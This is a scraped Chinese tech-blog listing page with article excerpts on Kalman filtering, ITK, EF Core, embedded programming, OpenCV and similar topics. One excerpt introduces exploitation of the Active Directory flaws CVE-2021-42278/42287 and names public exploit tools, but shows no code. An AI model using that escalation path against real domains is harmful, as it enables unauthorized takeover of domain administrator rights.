		转自：【附源码+代码注释】误差状态卡尔曼滤波(error-state Kalman Filter)，扩展卡尔曼滤波，实现GPS+IMU融合，EKF ESKF GPS+IMU_一点儿也不萌的萌萌的博客-CSDN博客_误差状态卡尔曼滤波
原作者功力深厚，请移步认真学习。
2021年6月23日更新:发现了一个讲卡尔曼滤波特别好的视频，但是需要科学上网。卡尔曼滤波视频
最近在学习卡尔曼滤波器，今天抽出点儿时间总结一下！
我的所有源码都放在Github的仓库里面了：eskf-gps-imu-fusion（记得要给我点star呀，哈哈）
在这篇博客中，我将会向你解释GPS融合IMU的扩展卡尔曼的推导过程，并且还会提供完整的源代码和数据。
首先来看一张实验结果，下图是我通过仿真gps和imu数据得到的融合结果，GPS的误差大约在5米，IMU的是中等精度，可以看到通过卡尔曼融合之后，误差降低非常多。
红色的GPS的测量数据，蓝色是轨迹的真值，绿色是融合之后的轨迹，可以看到融合了imu之后的轨迹，相比于只有GPS的情况提升了很多，甚至与真实值都非常接近了。
1.前言
卡尔曼滤波器在1958年被卡尔曼等人提出之后，经历了60多年，这期间有各种变体被提出来，但是核心的思想并没有变化。这其中比较突出的工作有，EKF、IEKF、ESKF、UKF等等。它们的方程有一些差异，但是用法基本区别不大，只要学会应用其中的一种，别的就问题不大了。
卡尔曼滤波器的公式推导，并不重要!
卡尔曼滤波器的公式推导，并不重要!
卡尔曼滤波器的公式推导，并不重要!
如果你初学卡尔曼滤波器，千万不要在公式推导和理解上花费太多的精力，这将会得不偿失，根据我的学习经验，想直接从卡尔曼的公式推到上去理解用法是比较难的，但是先不管原因，边应用边学习，将会是一个非常正确的做法，对于理解卡尔曼滤波器将会事半功倍！
2. 状态误差卡尔曼（Error-State Kalman Filter，ESKF）
本篇博客我们将探索一下状态误差卡尔曼(ESKF)的应用，它是卡尔曼滤波器的变种中应用最为广泛的一种，与EKF一样，它也是一种针对时变系统的非线性滤波器。但是与EKF不同的是，它的线性化是总是在0附近，因此线性化更准确。
————————————————
根据我的经验，绝大部分的场景，ESKF就足够使用了。如果对于滤波有更高的要求，可以选择UKF，甚至PF(例子滤波)
2.1 状态方程的推导
在融合IMU和GPS的数据时，因为IMU的频率更高，所以常常用IMU的姿态解算作为轨迹增量的预测，如果使用EKF滤波器，那么就是这种做法。由于我们这里介绍的是更为复杂的ESKF，所以这里并不是对导航信息做滤波，而是对导航信息中的误差进行滤波，因为误差是小量，线性化时更精确。
这里直接给出IMU的误差方程，由于误差方程的推导比较复杂，需要的知识比较多，而且这里主要强调的是ESKF的用法，所以就忽略IMU误差方程的推导。
————————————————
如果你想系统学习IMU误差方程的推导，推荐你看《捷联惯导算法与组合导航原理》（严恭敏）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f31dd46dcc10e67e13921582f22150e/" rel="bookmark">
			医学图像数据增强-重采样itk
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		resample_augmentations.py
def resample_image_itk( ori_img, new_spacing=[1.0,1.0,1.0], new_size=[0,0,0], resamplemethod=sitk.sitkNearestNeighbor): """ @Args: :param ori_img: 原始需要对齐的itk图像 :param new_spacing: 111 :param new_size: 默认000, 注意非零则自动裁剪 :param resamplemethod: sitk.sitkLinear-线性 - image sitk.sitkNearestNeighbor-最近邻 -mask @Return: 重采样好的itk图像 """ ori_size = ori_img.GetSize() # 原始图像大小 [x,y,z] ori_spacing = ori_img.GetSpacing() # 原始的体素块尺寸 [x,y,z] ori_origin = ori_img.GetOrigin() # 原始的起点 [x,y,z] ori_direction = ori_img.GetDirection() # 原始的方向 [冠,矢,横]=[z,y,x] # 计算改变spacing后的size，用物理尺寸/体素的大小 if new_size==[0,0,0]: new_size[0] = int(ori_size[0]*ori_spacing[0]/new_spacing[0] + 0.5) new_size[1] = int(ori_size[1]*ori_spacing[1]/new_spacing[1] + 0.5) new_size[2] = int(ori_size[2]*ori_spacing[2]/new_spacing[2] + 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f31dd46dcc10e67e13921582f22150e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dda166273bf2ae832620e036c1bdc376/" rel="bookmark">
			Entity FrameWork Core教程，从基础应用到原理实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好！我是未来村村长，就是那个“请你跟我这样做，我就跟你这样做！”的村长👨‍🌾！
👩‍🌾“人生苦短，你用Python”，“Java内卷，我用C#”。
​ Entity FrameWork Core（简称EF Core）是.NET Core中的ORM(object relational mapping，对象关系映射)框架，即让程序员以面向对象的方式进行数据库操作。
一、EF Core组建流程 官方文档地址：https://docs.microsoft.com/zh-cn/ef/core/
1、基础配置 （1）NuGet包 ​ 我们通常使用MySQL数据库，.NET连接MySQL数据库需要导入两个库：
Microsoft.EntityFrameworkCorePomelo.EntityFrameworkCore.MySql （2）配置连接字符串 "ConnectionStrings": { "MySQL": "Server=localhost; Port=3306; Database=KnowledgeSet; User=root; Password=123456" } 2、创建实体 namespace Models.Entities { public class Student { public int StudentId { get; set; } public string StudentName { get; set; } } } 对应数据库DDL-SQL
CREATE TABLE `student` ( `StudentId` int NOT NULL AUTO_INCREMENT, `Name` varchar(100) NOT NULL, PRIMARY KEY (`StudentId`) ) ENGINE=InnoDB; 3、建立DbContext与服务注册 （1）DbContext建立 namespace Repositories.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dda166273bf2ae832620e036c1bdc376/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdbddc9de5bc89086338c1f8caa1a00d/" rel="bookmark">
			HAL库--DMA、串口cubemx配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 第一步：配置时钟
我用是stm32f103zetx
第二步：打开串口进行配置
以UART1为例子
1.MODE选异步通信------Asynchronous
Ⅰ、MODE中 Synchronous 为同步通信
2.Parameter Settings未进行配置，默认即可
3.NVIC Settings，enable选√
4.DMA Settings,add上usart1-rx和usart1-tx（到时候正常选择就行）
5.DMA Request Settings
① mode选为normal（还有一个Circular）
Normal：当一次DMA数据传输完后，停止DMA传送 ，也就是只传输一次
Circular：传输完成后又重新开始继续传输，不断循环永不停止
② 选Memory----Byte
这个Increment Address的第一类外设地址寄存器
第二类内存地址寄存器
第三步：DMA配置
在第二步配置完串口后我们就可以不配置dma，因为cube已经给我们配置好了。
DMA有四种传输方向：
外设到内存 Peripheral To Memory
内存到外设 Memory To Peripheral
内存到内存 Memory To Memory
外设到外设 Peripheral To Peripheral
-----------------------------------------------到此就完美了------------------------------------------------------
第四步：实地检验
定义一个数组，随便写点什么存在数组中，然后whlie（1）中调用usart1-DMA 的相关函数进行传输验证是否正确
while (1) { /* USER CODE END WHILE */ HAL_UART_Transmit_DMA(&amp;huart1,buf,sizeof(buf)); HAL_Delay(1000); /* USER CODE BEGIN 3 */ } /* USER CODE END 3 */ } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb8cdaf8029e68688239103fdc7d34fd/" rel="bookmark">
			图像几何校正
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		几何校正中混淆的概念 名词描述几何校正几何畸变会给基于遥感图像的定量分析、变化检测、图像融合 、地图测量或更新等处理带来误差（主要指二维平面坐标），所以需要针对图像的几何畸变进行校正，也就是几何校正。图像配准图像配准与几何校正的原理是完全相同的，即都涉及到空间位置（像元坐标）变换和像元灰度值重采样处理两个过程。图像配准注重的是图和图（数据）之间的一种几何关系 ，其目的是为了和参考数据达成一致，而不考虑参考数据的坐标是否标准、是否正确。正射校正正射校正不仅能够实现常规的几何校正功能，还能通过测量高程点和DEM来消除地形起伏引起的图像几何畸变，提高图像的几何精度。（个人理解，正射校正是几何校正中精度最高的，需要使用参数PRC（rational polynomial coefficients）或RMS(replacement sensor model)、高程信息，主要指有理函数模型来校正。）图像校正主要包括辐射校正和几何校正等。坐标变换几何校正的空间位置变换关系未知，需要利用控制点的坐标来建立空间位置变换关系。投影转换可以根据两种投影类型及其参数推导出明确的空间位置变换关系，因此投影转换时只需设置输出图像的投影类型及其参数、以及灰度重采样方法。添加投影指输入图像本身具有某种投影类型，只是投影信息因某种原因暂时丢失了，所以需要重新给图像添加投影信息，它不会引起图像内容的任何变化。 在遥感成像过程中，传感器生成的图像像元相对于地面目标物的实际位置发生了挤压、拉伸、扭曲和偏移等问题，这一现象我们称之为几何畸变。
几何畸变会给基于遥感图像的定量分析、变化检测、图像融合 、地图测量或更新等处理带来误差，所以需要针对图像的几何畸变进行校正，也就是几何校正。
几何畸变原因 传感器内部因素：包括透镜、 探测元件、采样速率、扫描镜等引起的畸变。遥感平台因素：包括由于平台 的高度、速度、轨道偏移及姿 态变化引起的图像畸变。地球因素：地球自转、地形起 伏、地球曲率等。此外，大气折射和投影方式的 选择也会造成图像畸变。 几何畸变类型 按照畸变的性质，可以将几何畸变分为系统性畸变（内部 ）和随机性畸变（外部）。
系统性畸变是指遥感系统造成的畸变，这种畸变一般有一 定的规律性，并且其畸变程度事先能够预测，例如扫描镜的结构方式和扫描速度等造成的畸变。随机性畸变是指大小不能预测，其出现带有随机性质的畸 变，例如地形起伏造成的随地而异的几何偏差。 几何校正类型 遥感图像的几何校正分为两种：几何粗校正和几何精校正。
几何粗校正是根据产生畸变的原因，利用空间位置变化关系 ，采用计算公式和取得的辅助参数进行的校正，又称为系统几何校正。几何精校正是指利用地面控制点做的精密校正。几何精校正不考虑引起畸变的原因，直接利用地面控制点建立起像元坐标与目标物地理坐标之间的数学模型，实现不同坐标系统中像元位置的变换。 几何校正过程 几何校正涉及两个过程：
一是空间位置（像元坐标）的变换二是像元灰度值的重新计算（重采样） 像素坐标变换方法 直接法：从原始图像阵列出发，依次计算每个像元在输出图像 （校正后图像）中的坐标。直接法输出的像元值大小不会发生变化，但输出图像中的像元分布不均匀。
间接法：从输出图像（空白图像）阵列出发，依次计算每个像元在原始图像中的位置，然后计算原始图像该位置的像元值， 再将计算的像元值赋予输出图像像元。此方法能保证校正后图像的像元在空间上均匀分布，但需要进行灰度的重采样，是最常用的几何校正方法。
线性变换：通过平移和各向异性尺度参数化的简单变换。
赫尔默特（仿射变换）：二维 helmert 变换，由各向同性比例、旋转角度和平移参数化。
多项式模型：
这个模型比较简单，回避了遥感影像的成像过程，适用于覆盖面积不大和地形比较平坦的区域。
薄板样条模型
投影变换（单应性变换、透视变换）：平面投影变换，由单应性表示。
共线方程模型（卫星传感器模型）：
依据卫星遥感成像的几何关系，利用摄影测量学中成像瞬间的地面点、透视中心以及相应的像素点三点共线建立起来的一种模型，但是此模型需要DEM数据，优点是精度比较高。
有理函数模型（RPM）：
建立像素和地面位置对应关系的简单数学模型。理论上可以达到跟严格卫星传感器模型相当的定位精度。其优点在于多项式包含高程信息,可以提高校正精度。这个模型自带了高程信息，一般需要影像提供RPC文件，或者用户自己选择地面控制点。
局部区域校正模型（局部三角网）：
这个模型的基本思想是利用控制点建立不规则三角网，然后分区域利用几何多项式校正，但是这种模型需要很多的控制点，对于地形起伏很大的区域需要的控制点更多，往往实施难度比较大
RBF神经网络校正
BP神经网络
前5种坐标变换方法，参考自QGIS种配准工具的坐标变换方法。卫星传感器模型应该是卫星中心常用的模型；仿射变换、有理函数模型与局部三角网是ENVI中的实现的几何校正方法；后2种神经网络方法，来源于参考文献。
补充知识：
线性变换：缩放、旋转 仿射变换：线性变换 + 平移 相似变换：是仿射变换的一种特殊（简单）的情况。 透视变换：仿射变换后平行四边形的各边仍操持平行，透视变换结果允许是梯形等四边形，所以仿射变换是透视变换的子集 个人理解，二维 helmert 变换应该是仿射变换，如有理解错误欢迎指正。
坐标变换：地面控制点的选择 地面控制点需在图像上有明显的、清晰的识别标志，如道路交叉点、建筑边界、农田界线、飞机场、城廓线等。地面控制点上的地物不随时间而变化，以保证当两幅不同时间的图像或地图几何校正时，可以同时识别出来。在没有做过地形校正的图像上选择控制点时，应在同一地 形高度上进行。地面控制点应当均匀地分布在整幅图像内，且要有一定的数量保证（大于多项式校正模型的未知参数个数，n次多项式控制点的最少数目为(n+1)(n+2)/2）。 坐标变换：几何校正精度评估 几何校正一般通过均方根误差RMS来观察控制点的几何校正精度，单位为像元
R M S = ( x r − x i ) 2 + ( y r − y i ) 2 R M S=\sqrt{\left(x_{r}-x_{i}\right)^{2}+\left(y_{r}-y_{i}\right)^{2}} RMS=(xr​−xi​)2+(yr​−yi​)2 ​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb8cdaf8029e68688239103fdc7d34fd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fb4360cf07bcb89fb070c201e0710f2/" rel="bookmark">
			机器学习之基础知识（全）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.机器学习概述
1.1 人工智能概述
1.1.1 人工智能使用场景
1.1.2 人工智能小案例
1.2 人工智能发展历程
1.2.1 图灵测试
1.2.2 发展历程
1.2.3 小结
1.3 人工智能主要分支
1.3.1 人工智能、机器学习和深度学习
1.3.2 主要分支介绍
1.3.3 人工智能发展必备三要素
1.3.4 拓展：GPU和CPU对比
1.4 机器学习工作流程
1.4.1 什么是机器学习
1.4.2 机器学习工作流程
1.4.3 获取到的数据集介绍
1.4.4 数据基本处理
1.4.5 特征工程
1.4.6 机器学习和模型评估概念
1.5 机器学习算法分类
1.5.1 监督学习
1.5.2 无监督学习
1.5.3 半监督学习
1.5.4 强化学习
1.5.5 小结
1.6 模型评估
1.6.1 分类模型评估
1.6.2 回归模型评估
1.6.3 拟合
1.7 Azure平台简介
1.8 深度学习简介【了解】
1.8.1 深度学习--神经网络简介
1.8.2 深度学习各层负责的内容
2.机器学习基础环境安装与使用
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0fb4360cf07bcb89fb070c201e0710f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21c9dc1c129fddd3fcf0a72e037de961/" rel="bookmark">
			点云滤波处理(使用CloudCompare软件)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近研究了一下点云滤波的功能，所以写一篇笔记记录一下。
文章目录 一、点云滤波的意义二、梯度滤波(Gradient)算法三、CSF(Cloth Simulation Filter)过滤算法四、Bilateral滤波算法 一、点云滤波的意义 在我们获取点云的时候，总会由于设备精度的限制、操作人员的人为因素和环境条件因素等带来的影响，以及电磁波衍射特性和数据进行拼接配准操作过程的影响，点云数据总会产生一些我们意想不到的噪声点。在点云处理流程中滤波处理作为预处理的第一步，往往对后续处理的影响很大，因此只有在滤波预处理中将噪声点、离群点等等按照后续处理定制，才能更好的进行配准、特征提取、曲面重建和可视化等后续的处理。
·而在PCL中总结了几种需要进行点云滤波处理的情况，这几种情况分别是：
(1)点云数据密度不规则需要平滑。
(2)因为遮挡等问题造成离群点需要去除。
(3)大量数据需要进行“下采样”(Downsample)。
(4)噪声数据需要去除。
·对应的解决方法是：
(1)按具体给定的规则限制过滤去除点。
(2)通过常用滤波算法修改点的部分属性。
(3)对数据进行下采样。
说了这么多，接下来就使用CloudCompare软件来进行简单的滤波处理。
二、梯度滤波(Gradient)算法 因为在CloudCompare软件中，我并没有找到现成的功能(指点击一下就自行处理)，所以我是用CC中的几个小功能结合在一起才能达到滤波的效果。
1、打开软件，加载数据。
2、为该数据添加Scalar标量字段，像CC中的这种标量字段以我现在的理解它和Aicgis中属性表的字段应该一样，都是可以表示对象的某种属性值，本次实验是把点云的z坐标值作为它的一个scalar。
3、点击Gradient功能按钮，CC会根据当前的scalar字段计算出一个Gradient字段。
这一步是在问我们是否要按照欧式距离来计算得出Gradient字段，这里我选择了是，因为当前字段是点云实体的高程字段。
此时该字段的值表示的是两个相邻点之间的倾斜度。
4、得到了Gradient字段之后，我们可以利用梯度的值对原始数据进行简单的过滤。
5、填写Gradient值的范围(这个范围指的是你想要将梯度值0.3-1.0之间的点云剔除，保留剩下的点云数据)进行点云的过滤，点击Split即可。
6、实现的效果
过滤掉的点云部分：
最终效果：
三、CSF(Cloth Simulation Filter)过滤算法 该方法相较于之前的操作步骤相对而言简单了很多，其原理也非常的巧妙：是将扫描得到的点云进行倒置，然后用一种刚性布料覆盖翻转后的点云。通过分析布料节点与相应点云中的点之间的相互作用，可以确定布料节点的位置用以生成近似的地表形状，最后，再通过比较原始点云中的点和生成的布料曲面之间的距离，实现从点云实体中提取地面点。
具体操作步骤如下：
1、打开软件，加载数据(同上)。
2、选中点云对象，点击cc中“plugin”中的“CSF filter”。
3、设置CSF方法的参数。
图中：Cloth resolution：是指用于覆盖地形的布的网格大小(单位与点云的单位相同)。你设置的布分辨率越大，你得到的DTM就越粗糙；Max iterations：是指地形仿真的最大迭代次数。500对大多数场景来说都足够了。Classification threshold：是指根据点与模拟地形之间的距离，将点云划分为地面和非地面部分的阈值。0.5适用于大多数场景。
4、点击“OK”即可，处理效果如下：
过滤掉的点云部分：
最终效果：
从二和三中的处理效果可以发现，虽然二中的Gradient算法可以去除了很多草的主干部分，但是仍有一部分的残余的点云漂浮在地面之上；三中的CSF算法则可以去除草的上半部分，而对草的根部去除的效果并不理想。所以我就结合两种方法，先使用Gradient算法进行了第一次过滤，然后又使用了CC中的CSF过滤方法对数据进行了第二次过滤，处理的效果如下所示：
四、Bilateral滤波算法 双边滤波算法是通过考虑中心像素点到邻域像素点的距离(一边)以及像素亮度差值所确定的权重(另一边)来修正当前采样中心点的位置，从而达到平滑滤波效果。同时也会有选择性的剔除部分与当前采样点“差异”太大的相邻采样点 ，从而达到保持原特征的目的。
将三中最后处理的结果作为本次实验的对象。
1、选择要进行滤波处理的点云对象，并把当前的scalar设置为Coord.z，点击“Edit”——“Scalar Field”——“Bilateral Filter”算法。
2、设置参数。
图中：Spatial sigma：是指空间标准差，也就是定义中所提到的“中心像素点到邻域像素点的距离”的标准差。Scalar sigma：标量标准差，也就是指定义中的“像素亮度差值所确定的权重”的标准差。
3、点击“OK”即可生成Bilateral标量字段。
4、然后将Bilateral字段设置为原点云数据的Z坐标值即可。
最后效果：
同理，Gaussian过滤方法也可以通过上述的操作过程得以实现。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55eb31a21d7ca4ef0a24d9fa7b5383ff/" rel="bookmark">
			【二分查找】leetcode 1552. 两球之间的磁力
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1552. 两球之间的磁力
题目描述 在代号为 C-137 的地球上，Rick 发现如果他将两个球放在他新发明的篮子里，它们之间会形成特殊形式的磁力。Rick 有 n 个空的篮子，第 i 个篮子的位置在 position[i] ，Morty 想把 m 个球放到这些篮子里，使得任意两球间 最小磁力 最大。
已知两个球如果分别位于 x 和 y ，那么它们之间的磁力为 |x - y| 。
给你一个整数数组 position 和一个整数 m ，请你返回最大化的最小磁力。
示例1： 输入： position = [1,2,3,4,7], m = 3
输出： 3
解释： 将 3 个球分别放入位于 1，4 和 7 的三个篮子，两球间的磁力分别为 [3, 3, 6]。最小磁力为 3 。我们没办法让最小磁力大于 3 。
示例2： 输入： position = [5,4,3,2,1,1000000000], m = 2
输出： 999999999
解释： 我们使用位于 1 和 1000000000 的篮子时最小磁力最大。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55eb31a21d7ca4ef0a24d9fa7b5383ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e00004f936e1de69323d38a6724c2827/" rel="bookmark">
			opencv图像旋转
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图像的旋转 图像旋转是指图像按照某个位置转动一定的角度的过程，旋转中图像仍保持着原始尺寸。图像旋转后图像水平对称轴、垂直对称轴及中心坐标原点都可能会发生变换，因此需要对图像旋转中的坐标进行相应转换。
如图所示：
API:
cv2.getRotationMatrix2D(center,angle,scale)
参数：
Center：旋转中心
Angle:旋转角度
Scale:缩放比例
返回：
M：旋转矩阵
调用cv.warpAffine完成图像的旋转
代码展示：
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt
#读取图像
img = cv.imread(“ ”)
#图像旋转
rows，cols = img.shape[:2]
#生成旋转矩阵
M = cv.getRotationMatrix2D((cols/2,rows/2),90,1)
#进行旋转变换
dst= cv.warpAffine(img,M,(cols,rows))
#图像展示
fig,axes=plt.subplots(nrows=1,ncols=2,figsize=(10,8),dpi=100)
axes[0].imshow(img1[:,:,::-1])
axes[0].set_title(“原图”)
axes[1].imshow(dst[:,:,::-1])
axes[1].set_title(“旋转后结果”)
plt.show()
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2564e3ef394910d14cf43ef93c4d20a6/" rel="bookmark">
			域内提权 (CVE-2021-42278 &amp; CVE-2021-42287) 漏洞利用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2021年11月，Microsoft 曝出了两个关于 Windows AD 域提权的漏洞：CVE-2021-42278 &amp; CVE-2021-42287，CVSS V3.1评分均为8.8，两个漏洞组合可导致域内普通用户提升至域管权限。
文章目录 一、漏洞介绍二、漏洞利用(一) sam-the-admin.py(二) noPac.py 三、漏洞修复 一、漏洞介绍 CVE-2021-42278利用AD域计算机账户认证漏洞，使用计算机账户的sAMAccountName冒充域控制器，结合CVE-2021-42287可以获取Kerberos特权属性证书 (PAC)，从而使域内普通用户权限提升至域管理员权限。
影响系统版本：
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2008 for 32-bit Systems Service Pack 2
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2564e3ef394910d14cf43ef93c4d20a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92a5ebb0118a41c74d7092c4ce08bcc6/" rel="bookmark">
			java中的switch用法,循环,方法,数组以及类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		选择结构语句之switch: switch 语句在开发过程中的使用仅次于 if 语句的使用. switch语句: switch 语句格式： switch ( 表达式 ) { case 值 1 ： 语句体 1 ; break ; case 值 2 ： 语句体 2 ; break ; … default ： 语句体 n + 1 ; break ; } 执行流程:
执行流程
switch接收结果,
接收的结果和case后面的值1进行对比,成立,执行语句1,break 结束语句; 值1和switch接收的结果不匹配,和值2进行比较,成立,执行语句2, break,结束语句; 如果上面case都不匹配,执行default语句,语句n,break ,结束... 代码实现:键盘录入一个值,判断星期
1,星期一
2,星期二
3,星期三,
4,星期四
5,星期五
6,星期六
7,星期日
import java.util.Scanner; public class SwitchDemo { public static void main(String[] args) { Scanner sc=new Scanner(System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/92a5ebb0118a41c74d7092c4ce08bcc6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26db9417e76c75479ecd20ca25d4007c/" rel="bookmark">
			OrCAD使用问题汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 ****使用技巧****全局查找网络切换鼠标大小十字原理图插入图片修改Orcad Titles器件编号重新排列 *****报错解决*****修改元器件后无法执行放置的问题器件编号重复报错 使用技巧 全局查找网络 Note：高亮某个网络右键后选择“Select Entire Net”即可
切换鼠标大小十字 快捷键：F6；
原理图插入图片 Place&gt;Picture…
Note：导入图片建议先转为Bmp格式；
修改Orcad Titles .选中你的原理图.dsn文件；
菜单选择 Edit &gt; Browse &gt; Titleblock；
然后一般选择第二项
按住Shift选中全部Titles；
在持第四步的前提下执行：Edit&gt;Properties(或者按Ctrl+E弹出browse spreadsheet)；
然后便可以在窗口中修改修内容，如以下。
Schematic Page Number
Schematic Page Count
Page Number
Page Count
(最后这两项就是所有原理图中右下角的表格内容) 器件编号重新排列 首先将位号复位
a. 右键“xxx.dsn”
b.选中复位选项，即可将器件编号复位为“xx？”
然后，便可以对器件进行重新编号
a. 右键“xxx.dsn”
b.选中对器件强制编号选项，即可将器件编号复位为“xx？” 报错解决 其实很多时候不是设计的错，而仅仅只是我们对软件使用的某些墨守成规或者说暂时未接触过的的逻辑不够熟悉而缺少了某些操作步骤；
修改元器件后无法执行放置的问题 错误：当想放置新的器件时，就会报出如图所示错误。
原因：如图，OrCAD的工程会有缓存，当缓存的文件和我们要放置的器件不匹配就会报；
解决：将缓存里的替代即可，操作如图。
器件编号重复报错 错误：在绘图中过程中，有时候会对器件进行各种操作，因此可能存在部分器件编号重复的现象；原因：错误操作等；解决：重复编号，并对齐处理
a. 选中xxx.dsn后，操作Tool&gt;Design Rules Check;
b. 选中物理规则检查
c. 选择输出一份相同位号的DRC检查报告
d.即可在DRC输出文件中看到是否有重复编号报错1631与重复的器件编号
待继续学习补充中…
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05afe01224d56154424b1bce2e388bc2/" rel="bookmark">
			Ant G6 在vue项目上的引入以及使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ant G6 在vue上的使用 1.引入方式2.创建画布3.数据准备4.初始化 G65.配置连接线上的动画效果6.调用位置7.G6的监听方法8.进阶操作，交互功能效果图拓展节点类型 1.引入方式 引入方式分为两种：
1-1：在 HTML 中使用 CDN 引入
// version &lt;= 3.2 &lt;script src="https://gw.alipayobjects.com/os/antv/pkg/_antv.g6-{$version}/build/g6.js"&gt;&lt;/script&gt; // version &gt;= 3.3 &lt;script src="https://gw.alipayobjects.com/os/lib/antv/g6/{$version}/dist/g6.min.js"&gt;&lt;/script&gt; // version &gt;= 4.0 &lt;script src="https://gw.alipayobjects.com/os/lib/antv/g6/4.3.11/dist/g6.min.js"&gt;&lt;/script&gt; 1-2：在项目中使用 NPM 包引入
npm install --save @antv/g6 //在需要用的 G6 的 JS 文件中导入： import G6 from '@antv/g6'; 2.创建画布 需要在 HTML 中创建一个用于容纳 G6 绘制的图的容器，通常为 div 标签。G6 在绘制时会在该容器下追加 canvas 标签，然后将图绘制在其中：
&lt;template&gt; &lt;div class="container" id="container"&gt; &lt;/div&gt; &lt;/template&gt; 3.数据准备 data() { return { graph: null,//初始化 registerEdge: null,//线上的动画效果初始化 newData: { nodes: [//节点 { id: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05afe01224d56154424b1bce2e388bc2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8332b086ff14d52f328a27be6886abb1/" rel="bookmark">
			RTT各种错误排查（个人方法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		试图切入ARM状态造成的用法Fault
问题：1.可能是内存泄漏 程序中有野指针，导致堆栈破坏；
个人工程中 排查发现为数组拷贝溢出数组大小，野指针导致堆栈破坏。
相应报错可能有：
1.RT_ASSERT 断言死机
2.rt_object_get_type((rt_object_t)thread) == RT_Object_Class_Thread) has assert failed at
都是内存泄漏，导致其他变量被改写。导致错误。
3.使用memchec命令 打印Memory block wrong:
怀疑到内存管理算法问题，改变内存管理算法。报错会不一样哦。sr: 0x00000000
r00: 0x20001268
r01: 0x10000000
r02: 0xf0000000
r03: 0x00000000
r04: 0x0801a130
r05: 0x0801a130
r06: 0x00000000
r07: 0x0000008c
r08: 0x00000000
r09: 0x00000000
r10: 0x00000000
r11: 0x00000000
r12: 0x00000000
lr: 0x080120f7
pc: 0x20000170
hard fault on handler usage fault:
SCB_CFSR_UFSR:0x02 INVSTATE
其实就是试图切入ARM状态造成的用法Fault。但是CM组件无效，系统初始化失败。这种问题个人排查为：线程堆栈不足导致。可以对相应文件选择不优化与最小优化编译后看看能不能用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5903789a9125b617355da730d3cad1e/" rel="bookmark">
			ESP8266&amp;&amp;ESP32 NodeMcu擦除flash
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 这几天在玩esp8266时，用下载工具可以将固件刷到flash中，但是在重新刷写另一与之完全不同的新固件时，可能会有上个固件残留下来的系统参数与用户参数会对新固件产生影响 （比如说wifi账号密码）
所以，使用一个干净的flash空间还是蛮重要的。查阅半天网上没有类似的软件可以擦除整个flash，只有借助python将其擦写干净
安装pyhton和 环境配置 以及 pip 官网下载链接：https://www.python.org/downloads/windows/
具体下载安装就不说了，网上一大把，我已安装python多年
给个连接：https://blog.csdn.net/ruanjimu/article/details/121549510
安装esptool和pyserial Win + r ，输入cmd
# pip install esptool
# pip install pyserial
我以及安装好了的了，所有是这样的
擦除FLASH 注意，擦除的方式和烧录一样，具体按键操作请看：
https://blog.csdn.net/weixin_49861340/article/details/123792561
首先药插入设备，确认esp8266的端口号，我的端口号是COM5，运行以下命令来擦除flash
# esptool --port COM5 erase_flash
也有的可能会报错，不是内部或者外部命令，就运行
# esptool.py --port COM5 erase_flash
残留下来的系统参数与用户参数就没了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
